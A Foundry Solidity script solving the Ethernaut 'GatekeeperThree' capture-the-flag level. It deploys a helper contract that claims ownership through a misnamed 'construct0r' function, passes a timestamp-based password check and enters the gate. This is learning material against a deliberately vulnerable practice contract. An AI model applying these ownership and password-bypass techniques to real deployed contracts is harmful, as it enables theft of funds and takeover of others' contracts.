// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
import {GatekeeperThree, SimpleTrick} from "../../challenge-contracts/28-GatekeeperThree.sol";

contract GatekeeperThreeSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x653239b3b3E67BC0ec1Df7835DA2d38761FfD882;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        ////////////////////////////////////////////////////////////////////////////////////
        // Start of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////
        // Step 1: Deploy Solution contract;
        Solution solution = new Solution(challengeInstance);

        // Step 2: Send more than 0.001 ether to the GatekeeperThree contract;
        // For modifier gateThree()
        (bool success, ) = payable(challengeInstance).call{value: 0.0011 ether}(
            ""
        );
        require(success, "Failed to send Ether");

        // Step 3: Call `open()` function of Solution contract;
        solution.open();

        // Step 4: Confirm that caller `heroAddress` has successfully become entrant of the GatekeeperThree contract.
        GatekeeperThree three = GatekeeperThree(payable(challengeInstance));
        address heroAddress = vm.addr(heroPrivateKey);
        require(three.entrant() == heroAddress, "Entrant check failed");

        ////////////////////////////////////////////////////////////////////////////////////
        // End of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(28));
    }
}

////////////////////////////////////////////////////////////////////////////////////
// Start of Ric Li C's Solution (Extra Contract)
// Additional contract codes to help solve this puzzle
////////////////////////////////////////////////////////////////////////////////////
contract Solution {
    GatekeeperThree three;
    SimpleTrick trick;

    constructor(address threeAddress) {
        three = GatekeeperThree(payable(threeAddress));
        three.createTrick();
        trick = three.trick();
    }

    function open() external {
        // For modifier gateOne()
        three.construct0r();

        // For modifier gateTwo()
        trick.checkPassword(block.timestamp); // If `trick = three.trick();` is moved into function `open()`, this line will not be needed.
        three.getAllowance(block.timestamp);

        three.enter();
    }
}
////////////////////////////////////////////////////////////////////////////////////
// End of Ric Li C's Solution (Extra Contract)
////////////////////////////////////////////////////////////////////////////////////
